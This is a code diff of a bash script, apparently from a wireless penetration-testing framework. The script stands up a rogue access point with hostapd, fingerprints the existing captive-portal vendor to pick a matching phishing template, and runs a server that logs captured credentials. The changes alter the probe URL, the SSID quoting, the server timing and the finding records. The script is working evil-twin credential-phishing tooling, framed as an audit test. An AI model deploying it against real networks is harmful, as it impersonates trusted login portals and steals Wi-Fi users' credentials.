@@ -28,7 +28,6 @@ set -euo pipefail
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
 C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
 # Inputs from Environment
@@ -62,9 +61,11 @@ HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
 DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 
 # --- Vendor Fingerprinting: detect existing captive portal before taking over ---
-echo -e "${C_ACTION}[*] Probing for existing captive portal vendor...${C_RESET}"
+# Probe a captive portal detection URL (Apple/Google CNA URLs) and follow redirects.
+# The redirect destination or response body will contain the vendor's portal signature.
+echo "[*] Probing for existing captive portal vendor..."
 VENDOR_PROBE_TMP="${EVIDENCE_DIR}/F3_vendor_probe.tmp"
-curl -siL --max-time 5 http://1.1.1.1 > "${VENDOR_PROBE_TMP}" 2>/dev/null || true
+curl -siL --max-time 5 http://captive.apple.com/hotspot-detect.html > "${VENDOR_PROBE_TMP}" 2>/dev/null || true
 DETECTED_VENDOR="unknown"
 if grep -qiE "identityservicesengine|guestportal|sponsorportal|cisco\.com/auth" "${VENDOR_PROBE_TMP}"; then
     DETECTED_VENDOR="cisco_ise"
@@ -79,8 +80,8 @@ elif grep -qiE "ubnt\.com|unifi|guest/s/" "${VENDOR_PROBE_TMP}"; then
 elif grep -qiE "pfsense|captiveportal" "${VENDOR_PROBE_TMP}"; then
     DETECTED_VENDOR="pfsense"
 fi
-printf '{"detected_vendor": "%s", "probe_url": "http://1.1.1.1"}\n' "${DETECTED_VENDOR}" > "${EVIDENCE_DIR}/F3_vendor.json"
-echo -e "[+] Detected vendor: ${C_VAR}${DETECTED_VENDOR}${C_RESET}"
+printf '{"detected_vendor": "%s", "probe_url": "http://captive.apple.com/hotspot-detect.html"}\n' "${DETECTED_VENDOR}" > "${EVIDENCE_DIR}/F3_vendor.json"
+echo "[+] Detected vendor: ${DETECTED_VENDOR}"
 # Auto-select phishing template from detected vendor (only if still using default)
 if [[ "${PHISH_TEMPLATE}" == "generic" ]]; then
     case "${DETECTED_VENDOR}" in
@@ -89,7 +90,7 @@ if [[ "${PHISH_TEMPLATE}" == "generic" ]]; then
         meraki)          PHISH_TEMPLATE="meraki" ;;
     esac
     if [[ "${DETECTED_VENDOR}" != "unknown" && "${PHISH_TEMPLATE}" != "generic" ]]; then
-        echo -e "[*] Auto-selected template: ${C_VAR}${PHISH_TEMPLATE}${C_RESET}"
+        echo "[*] Auto-selected template: ${PHISH_TEMPLATE}"
     fi
 fi
 rm -f "${VENDOR_PROBE_TMP}"
@@ -146,7 +147,7 @@ fi
 cat <<EOF > "$HOSTAPD_CONF"
 interface=$INTERFACE
 driver=nl80211
-ssid="$SSID"
+ssid=$SSID
 hw_mode=g
 channel=${GUEST_CHANNEL:-6}
 auth_algs=1
@@ -225,13 +226,13 @@ except Exception as e:
 EOF
 
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    # FOREGROUND
-    ( cd "$PHISH_DIR" && timeout --foreground "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
+    # FOREGROUND — python server logs credentials to stderr; 2>&1 captures it in tee
+    ( cd "$PHISH_DIR" && timeout "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
 else
     # BACKGROUND
     ( cd "$PHISH_DIR" && python3 server.py > "$SERVER_LOG" 2>&1 ) &
     HTTP_PID=$!
-    sleep "$SCAN_TIME"
+    wait "$HTTP_PID" 2>/dev/null || true
 fi
 
 cleanup
@@ -252,8 +253,19 @@ if grep -qi "CREDENTIALS CAPTURED" "$SERVER_LOG" 2>/dev/null; then
         --rationale "Captive portal phishing is a highly effective fallback attack when technical encryption cannot be breached."
 else
     echo -e "[+] Mission complete. No data harvested."
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "[F3] Audit Complete" \
+        --severity INFO \
+        --desc "Captive portal phishing page deployed for SSID '$SSID' — no credentials submitted during test window." \
+        --target "$SSID" \
+        --evidence "$SERVER_LOG" \
+        --rationale "No user interaction observed. The portal was reachable but no credentials were entered."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 
 # Hold window if in tactical mode so user can see final output/errors
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
